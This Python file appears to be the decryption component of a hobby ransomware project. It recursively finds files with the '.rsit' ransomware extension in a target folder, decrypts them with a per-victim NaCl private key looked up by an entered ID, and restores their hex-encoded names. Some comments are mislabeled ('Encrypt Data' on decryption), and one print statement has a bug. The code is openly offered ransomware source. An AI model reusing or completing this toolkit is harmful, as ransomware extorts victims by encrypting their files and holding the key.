import binascii
import os
from pathlib import Path
from nacl.public import SealedBox, PrivateKey

class Cryptographer:
    """
    Encrypt folders from / path
    """

    FILE_EXTENSION = ".rsit"

    def __init__(self, private_key):
        self.box = SealedBox(private_key)

    def decrypt_data(self, filename):
        """
        Decrypt data using the private key
        """

        # Get data from file
        with open(filename, 'rb') as file:
            data = file.read()

        # Decode data from hex
        decoded_encrypted_data = binascii.unhexlify(data)

        # Decrypt data
        decrypted_data = self.box.decrypt(decoded_encrypted_data)

        # Write decrypted_data to file
        with open(filename, 'wb') as file:
            file.write(decrypted_data)

    ############################################
    #           Encode/Decode Filename         #
    ############################################


    def decode_filename(self, filename):
        """
        Decode filename
        """
        # Get filename without ransomware extension
        my_file = Path(filename).stem

        # Decode filename from hex
        decoded_filename = binascii.unhexlify(my_file)

        # Rename file
        os.rename(filename, decoded_filename)


    ############################################
    #          Encrypt/Decrypt Folders         #
    ############################################

    def decrypt_folder(self, path):
        """
        Decrypt files in folder and subfolders from path
        """

        # Encrypt and encode all files in folders with specified extensions
        for root, _, files in os.walk(path, topdown=True):
            for filename in files:
                if self.FILE_EXTENSION in filename:
                    target = f'{root}/{filename}'
                    self.decrypt_data(target)  # Encrypt Data
                    self.decode_filename(target)  # Encode Filename

class Key:
    """
    Key class manage a key pair
    """

    def __init__(self):
        self.private = PrivateKey.generate()
        self.public = self.private.public_key

    def load_key(self, key_id):
        """
        Load keys into variables from files
        """

        # Try opening private.key
        try:
            with open(f'{key_id}_private.key', 'rb') as file:
                self.private = PrivateKey(file.read())
        except FileNotFoundError:
            print(f'[!] {id}_private.key not found')

if __name__ == "__main__":

    # CONSTANT
    TARGET_PATH = "/home/USERNAME/Documents/CrashTest"

    # Create instances
    key = Key()

    keys_id = input("Enter your ID : ")

    key.load_key(keys_id)
    crypto = Cryptographer(key.private)

    # Encrypt folder
    crypto.decrypt_folder(TARGET_PATH)
